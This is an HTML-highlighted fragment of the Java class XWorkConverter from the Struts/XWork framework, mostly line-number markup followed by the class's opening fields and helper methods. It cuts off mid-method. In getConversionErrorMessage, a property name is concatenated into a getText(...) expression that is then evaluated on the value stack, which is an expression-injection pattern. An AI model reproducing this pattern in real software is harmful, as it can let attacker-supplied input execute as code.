</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span><span class="lnt">373
</span><span class="lnt">374
</span><span class="lnt">375
</span><span class="lnt">376
</span><span class="lnt">377
</span><span class="lnt">378
</span><span class="lnt">379
</span><span class="lnt">380
</span><span class="lnt">381
</span><span class="lnt">382
</span><span class="lnt">383
</span><span class="lnt">384
</span><span class="lnt">385
</span><span class="lnt">386
</span><span class="lnt">387
</span><span class="lnt">388
</span><span class="lnt">389
</span><span class="lnt">390
</span><span class="lnt">391
</span><span class="lnt">392
</span><span class="lnt">393
</span><span class="lnt">394
</span><span class="lnt">395
</span><span class="lnt">396
</span><span class="lnt">397
</span><span class="lnt">398
</span><span class="lnt">399
</span><span class="lnt">400
</span><span class="lnt">401
</span><span class="lnt">402
</span><span class="lnt">403
</span><span class="lnt">404
</span><span class="lnt">405
</span><span class="lnt">406
</span><span class="lnt">407
</span><span class="lnt">408
</span><span class="lnt">409
</span><span class="lnt">410
</span><span class="lnt">411
</span><span class="lnt">412
</span><span class="lnt">413
</span><span class="lnt">414
</span><span class="lnt">415
</span><span class="lnt">416
</span><span class="lnt">417
</span><span class="lnt">418
</span><span class="lnt">419
</span><span class="lnt">420
</span><span class="lnt">421
</span><span class="lnt">422
</span><span class="lnt">423
</span><span class="lnt">424
</span><span class="lnt">425
</span><span class="lnt">426
</span><span class="lnt">427
</span><span class="lnt">428
</span><span class="lnt">429
</span><span class="lnt">430
</span><span class="lnt">431
</span><span class="lnt">432
</span><span class="lnt">433
</span><span class="lnt">434
</span><span class="lnt">435
</span><span class="lnt">436
</span><span class="lnt">437
</span><span class="lnt">438
</span><span class="lnt">439
</span><span class="lnt">440
</span><span class="lnt">441
</span><span class="lnt">442
</span><span class="lnt">443
</span><span class="lnt">444
</span><span class="lnt">445
</span><span class="lnt">446
</span><span class="lnt">447
</span><span class="lnt">448
</span><span class="lnt">449
</span><span class="lnt">450
</span><span class="lnt">451
</span><span class="lnt">452
</span><span class="lnt">453
</span><span class="lnt">454
</span><span class="lnt">455
</span><span class="lnt">456
</span><span class="lnt">457
</span><span class="lnt">458
</span><span class="lnt">459
</span><span class="lnt">460
</span><span class="lnt">461
</span><span class="lnt">462
</span><span class="lnt">463
</span><span class="lnt">464
</span><span class="lnt">465
</span><span class="lnt">466
</span><span class="lnt">467
</span><span class="lnt">468
</span><span class="lnt">469
</span><span class="lnt">470
</span><span class="lnt">471
</span><span class="lnt">472
</span><span class="lnt">473
</span><span class="lnt">474
</span><span class="lnt">475
</span><span class="lnt">476
</span><span class="lnt">477
</span><span class="lnt">478
</span><span class="lnt">479
</span><span class="lnt">480
</span><span class="lnt">481
</span><span class="lnt">482
</span><span class="lnt">483
</span><span class="lnt">484
</span><span class="lnt">485
</span><span class="lnt">486
</span><span class="lnt">487
</span><span class="lnt">488
</span><span class="lnt">489
</span><span class="lnt">490
</span><span class="lnt">491
</span><span class="lnt">492
</span><span class="lnt">493
</span><span class="lnt">494
</span><span class="lnt">495
</span><span class="lnt">496
</span><span class="lnt">497
</span><span class="lnt">498
</span><span class="lnt">499
</span><span class="lnt">500
</span><span class="lnt">501
</span><span class="lnt">502
</span><span class="lnt">503
</span><span class="lnt">504
</span><span class="lnt">505
</span><span class="lnt">506
</span><span class="lnt">507
</span><span class="lnt">508
</span><span class="lnt">509
</span><span class="lnt">510
</span><span class="lnt">511
</span><span class="lnt">512
</span><span class="lnt">513
</span><span class="lnt">514
</span><span class="lnt">515
</span><span class="lnt">516
</span><span class="lnt">517
</span><span class="lnt">518
</span><span class="lnt">519
</span><span class="lnt">520
</span><span class="lnt">521
</span><span class="lnt">522
</span><span class="lnt">523
</span><span class="lnt">524
</span><span class="lnt">525
</span><span class="lnt">526
</span><span class="lnt">527
</span><span class="lnt">528
</span><span class="lnt">529
</span><span class="lnt">530
</span><span class="lnt">531
</span><span class="lnt">532
</span><span class="lnt">533
</span><span class="lnt">534
</span><span class="lnt">535
</span><span class="lnt">536
</span><span class="lnt">537
</span><span class="lnt">538
</span><span class="lnt">539
</span><span class="lnt">540
</span><span class="lnt">541
</span><span class="lnt">542
</span><span class="lnt">543
</span><span class="lnt">544
</span><span class="lnt">545
</span><span class="lnt">546
</span><span class="lnt">547
</span><span class="lnt">548
</span><span class="lnt">549
</span><span class="lnt">550
</span><span class="lnt">551
</span><span class="lnt">552
</span><span class="lnt">553
</span><span class="lnt">554
</span><span class="lnt">555
</span><span class="lnt">556
</span><span class="lnt">557
</span><span class="lnt">558
</span><span class="lnt">559
</span><span class="lnt">560
</span><span class="lnt">561
</span><span class="lnt">562
</span><span class="lnt">563
</span><span class="lnt">564
</span><span class="lnt">565
</span><span class="lnt">566
</span><span class="lnt">567
</span><span class="lnt">568
</span><span class="lnt">569
</span><span class="lnt">570
</span><span class="lnt">571
</span><span class="lnt">572
</span><span class="lnt">573
</span><span class="lnt">574
</span><span class="lnt">575
</span><span class="lnt">576
</span><span class="lnt">577
</span><span class="lnt">578
</span><span class="lnt">579
</span><span class="lnt">580
</span><span class="lnt">581
</span><span class="lnt">582
</span><span class="lnt">583
</span><span class="lnt">584
</span><span class="lnt">585
</span><span class="lnt">586
</span><span class="lnt">587
</span><span class="lnt">588
</span><span class="lnt">589
</span><span class="lnt">590
</span><span class="lnt">591
</span><span class="lnt">592
</span><span class="lnt">593
</span><span class="lnt">594
</span><span class="lnt">595
</span><span class="lnt">596
</span><span class="lnt">597
</span><span class="lnt">598
</span><span class="lnt">599
</span><span class="lnt">600
</span><span class="lnt">601
</span><span class="lnt">602
</span><span class="lnt">603
</span><span class="lnt">604
</span><span class="lnt">605
</span><span class="lnt">606
</span><span class="lnt">607
</span><span class="lnt">608
</span><span class="lnt">609
</span><span class="lnt">610
</span><span class="lnt">611
</span><span class="lnt">612
</span><span class="lnt">613
</span><span class="lnt">614
</span><span class="lnt">615
</span><span class="lnt">616
</span><span class="lnt">617
</span><span class="lnt">618
</span><span class="lnt">619
</span><span class="lnt">620
</span><span class="lnt">621
</span><span class="lnt">622
</span><span class="lnt">623
</span><span class="lnt">624
</span><span class="lnt">625
</span><span class="lnt">626
</span><span class="lnt">627
</span><span class="lnt">628
</span><span class="lnt">629
</span><span class="lnt">630
</span><span class="lnt">631
</span><span class="lnt">632
</span><span class="lnt">633
</span><span class="lnt">634
</span><span class="lnt">635
</span><span class="lnt">636
</span><span class="lnt">637
</span><span class="lnt">638
</span><span class="lnt">639
</span><span class="lnt">640
</span><span class="lnt">641
</span><span class="lnt">642
</span><span class="lnt">643
</span><span class="lnt">644
</span><span class="lnt">645
</span><span class="lnt">646
</span><span class="lnt">647
</span><span class="lnt">648
</span><span class="lnt">649
</span><span class="lnt">650
</span><span class="lnt">651
</span><span class="lnt">652
</span><span class="lnt">653
</span><span class="lnt">654
</span><span class="lnt">655
</span><span class="lnt">656
</span><span class="lnt">657
</span><span class="lnt">658
</span><span class="lnt">659
</span><span class="lnt">660
</span><span class="lnt">661
</span><span class="lnt">662
</span><span class="lnt">663
</span><span class="lnt">664
</span><span class="lnt">665
</span><span class="lnt">666
</span><span class="lnt">667
</span><span class="lnt">668
</span><span class="lnt">669
</span><span class="lnt">670
</span><span class="lnt">671
</span><span class="lnt">672
</span><span class="lnt">673
</span><span class="lnt">674
</span><span class="lnt">675
</span><span class="lnt">676
</span><span class="lnt">677
</span><span class="lnt">678
</span><span class="lnt">679
</span><span class="lnt">680
</span><span class="lnt">681
</span><span class="lnt">682
</span><span class="lnt">683
</span><span class="lnt">684
</span><span class="lnt">685
</span><span class="lnt">686
</span><span class="lnt">687
</span><span class="lnt">688
</span><span class="lnt">689
</span><span class="lnt">690
</span><span class="lnt">691
</span><span class="lnt">692
</span><span class="lnt">693
</span><span class="lnt">694
</span><span class="lnt">695
</span><span class="lnt">696
</span><span class="lnt">697
</span><span class="lnt">698
</span><span class="lnt">699
</span><span class="lnt">700
</span><span class="lnt">701
</span><span class="lnt">702
</span><span class="lnt">703
</span><span class="lnt">704
</span><span class="lnt">705
</span><span class="lnt">706
</span><span class="lnt">707
</span><span class="lnt">708
</span><span class="lnt">709
</span><span class="lnt">710
</span><span class="lnt">711
</span><span class="lnt">712
</span><span class="lnt">713
</span><span class="lnt">714
</span><span class="lnt">715
</span><span class="lnt">716
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">XWorkConverter</span> <span class="kd">extends</span> <span class="n">DefaultTypeConverter</span> <span class="o">{</span>

    <span class="kd">protected</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">LOG</span> <span class="o">=</span> <span class="n">LoggerFactory</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">XWorkConverter</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">REPORT_CONVERSION_ERRORS</span> <span class="o">=</span> <span class="s">&#34;report.conversion.errors&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">CONVERSION_PROPERTY_FULLNAME</span> <span class="o">=</span> <span class="s">&#34;conversion.property.fullName&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">CONVERSION_ERROR_PROPERTY_PREFIX</span> <span class="o">=</span> <span class="s">&#34;invalid.fieldvalue.&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">CONVERSION_COLLECTION_PREFIX</span> <span class="o">=</span> <span class="s">&#34;Collection_&#34;</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">LAST_BEAN_CLASS_ACCESSED</span> <span class="o">=</span> <span class="s">&#34;last.bean.accessed&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">LAST_BEAN_PROPERTY_ACCESSED</span> <span class="o">=</span> <span class="s">&#34;last.property.accessed&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">MESSAGE_INDEX_PATTERN</span> <span class="o">=</span> <span class="s">&#34;\\[\\d+\\]\\.&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">MESSAGE_INDEX_BRACKET_PATTERN</span> <span class="o">=</span> <span class="s">&#34;[\\[\\]\\.]&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">PERIOD</span> <span class="o">=</span> <span class="s">&#34;.&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Pattern</span> <span class="n">messageIndexPattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="n">MESSAGE_INDEX_PATTERN</span><span class="o">);</span> 

    <span class="cm">/**
</span><span class="cm">     * Target class conversion Mappings.
</span><span class="cm">     * &lt;pre&gt;
</span><span class="cm">     * Map&lt;Class, Map&lt;String, Object&gt;&gt;
</span><span class="cm">     *  - Class -&gt; convert to class
</span><span class="cm">     *  - Map&lt;String, Object&gt;
</span><span class="cm">     *    - String -&gt; property name
</span><span class="cm">     *                eg. Element_property, property etc.
</span><span class="cm">     *    - Object -&gt; String to represent properties
</span><span class="cm">     *                eg. value part of
</span><span class="cm">     *                    KeyProperty_property=id
</span><span class="cm">     *             -&gt; TypeConverter to represent an Ognl TypeConverter
</span><span class="cm">     *                eg. value part of
</span><span class="cm">     *                    property=foo.bar.MyConverter
</span><span class="cm">     *             -&gt; Class to represent a class
</span><span class="cm">     *                eg. value part of
</span><span class="cm">     *                    Element_property=foo.bar.MyObject
</span><span class="cm">     * &lt;/pre&gt;
</span><span class="cm">     */</span>
    <span class="kd">protected</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Class</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;&gt;</span> <span class="n">mappings</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Class</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;&gt;();</span> <span class="c1">// action
</span><span class="c1"></span>
    <span class="cm">/**
</span><span class="cm">     * Unavailable target class conversion mappings, serves as a simple cache.
</span><span class="cm">     */</span>
    <span class="kd">protected</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">Class</span><span class="o">&gt;</span> <span class="n">noMapping</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">Class</span><span class="o">&gt;();</span> <span class="c1">// action
</span><span class="c1"></span>
    <span class="cm">/**
</span><span class="cm">     * Record class and its type converter mapping.
</span><span class="cm">     * &lt;pre&gt;
</span><span class="cm">     * - String - classname as String
</span><span class="cm">     * - TypeConverter - instance of TypeConverter
</span><span class="cm">     * &lt;/pre&gt;
</span><span class="cm">     */</span>
    <span class="kd">protected</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">TypeConverter</span><span class="o">&gt;</span> <span class="n">defaultMappings</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">TypeConverter</span><span class="o">&gt;();</span>  <span class="c1">// non-action (eg. returned value)
</span><span class="c1"></span>
    <span class="cm">/**
</span><span class="cm">     * Record classes that doesn&#39;t have conversion mapping defined.
</span><span class="cm">     * &lt;pre&gt;
</span><span class="cm">     * - String -&gt; classname as String
</span><span class="cm">     * &lt;/pre&gt;
</span><span class="cm">     */</span>
    <span class="kd">protected</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">unknownMappings</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>     <span class="c1">// non-action (eg. returned value)
</span><span class="c1"></span>
    <span class="kd">private</span> <span class="n">TypeConverter</span> <span class="n">defaultTypeConverter</span><span class="o">;</span>
    <span class="kd">private</span> <span class="n">ObjectFactory</span> <span class="n">objectFactory</span><span class="o">;</span>


    <span class="kd">protected</span> <span class="nf">XWorkConverter</span><span class="o">()</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="nd">@Inject</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setObjectFactory</span><span class="o">(</span><span class="n">ObjectFactory</span> <span class="n">factory</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">objectFactory</span> <span class="o">=</span> <span class="n">factory</span><span class="o">;</span>
        <span class="c1">// note: this file is deprecated
</span><span class="c1"></span>        <span class="n">loadConversionProperties</span><span class="o">(</span><span class="s">&#34;xwork-default-conversion.properties&#34;</span><span class="o">);</span>

        <span class="n">loadConversionProperties</span><span class="o">(</span><span class="s">&#34;xwork-conversion.properties&#34;</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nd">@Inject</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setDefaultTypeConverter</span><span class="o">(</span><span class="n">XWorkBasicConverter</span> <span class="n">conv</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">defaultTypeConverter</span> <span class="o">=</span> <span class="n">conv</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">getConversionErrorMessage</span><span class="o">(</span><span class="n">String</span> <span class="n">propertyName</span><span class="o">,</span> <span class="n">ValueStack</span> <span class="n">stack</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">defaultMessage</span> <span class="o">=</span> <span class="n">LocalizedTextUtil</span><span class="o">.</span><span class="na">findDefaultText</span><span class="o">(</span><span class="n">XWorkMessages</span><span class="o">.</span><span class="na">DEFAULT_INVALID_FIELDVALUE</span><span class="o">,</span>
                <span class="n">ActionContext</span><span class="o">.</span><span class="na">getContext</span><span class="o">().</span><span class="na">getLocale</span><span class="o">(),</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span>
                        <span class="n">propertyName</span>
                <span class="o">});</span>

        <span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">indexValues</span> <span class="o">=</span> <span class="n">getIndexValues</span><span class="o">(</span><span class="n">propertyName</span><span class="o">);</span>

        <span class="n">propertyName</span> <span class="o">=</span> <span class="n">removeAllIndexesInProperyName</span><span class="o">(</span><span class="n">propertyName</span><span class="o">);</span>

        <span class="n">String</span> <span class="n">getTextExpression</span> <span class="o">=</span> <span class="s">&#34;getText(&#39;&#34;</span> <span class="o">+</span> <span class="n">CONVERSION_ERROR_PROPERTY_PREFIX</span> <span class="o">+</span> <span class="n">propertyName</span> <span class="o">+</span> <span class="s">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">defaultMessage</span> <span class="o">+</span> <span class="s">&#34;&#39;)&#34;</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">message</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">stack</span><span class="o">.</span><span class="na">findValue</span><span class="o">(</span><span class="n">getTextExpression</span><span class="o">);</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">message</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">message</span> <span class="o">=</span> <span class="n">defaultMessage</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">message</span> <span class="o">=</span> <span class="n">MessageFormat</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="n">message</span><span class="o">,</span> <span class="n">indexValues</span><span class="o">.</span><span class="na">toArray</span><span class="o">());</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">message</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">removeAllIndexesInProperyName</span><span class="o">(</span><span class="n">String</span> <span class="n">propertyName</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">propertyName</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="n">MESSAGE_INDEX_PATTERN</span><span class="o">,</span> <span class="n">PERIOD</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="nf">getIndexValues</span><span class="o">(</span><span class="n">String</span> <span class="n">propertyName</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Matcher</span> <span class="n">matcher</span> <span class="o">=</span> <span class="n">messageIndexPattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">propertyName</span><span class="o">);</span>
        <span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">indexes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>
        <span class="k">while</span> <span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">find</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">Integer</span> <span class="n">index</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Integer</span><span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">group</span><span class="o">().</span><span class="na">replaceAll</span><span class="o">(</span><span class="n">MESSAGE_INDEX_BRACKET_PATTERN</span><span class="o">,</span> <span class="s">&#34;&#34;</span><span class="o">))</span> <span class="o">+</span> <span class="n">1</span><span class="o">;</span>
            <span class="n">indexes</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">index</span><span class="o">));</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">indexes</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">buildConverterFilename</span><span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
